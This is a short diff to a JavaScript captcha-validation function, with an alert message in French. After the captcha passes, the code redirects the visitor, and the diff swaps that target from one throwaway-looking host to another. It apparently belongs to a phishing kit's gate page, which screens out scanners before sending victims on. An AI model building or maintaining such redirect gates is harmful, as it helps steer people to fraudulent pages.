@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://cr926333.tw1.ru/";
+        targetURL="https://diosfac.hstn.me/?i=2/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
@@ -38,6 +38,7 @@ window.location=targetURL;
     }
 
 }
+
 
 
 
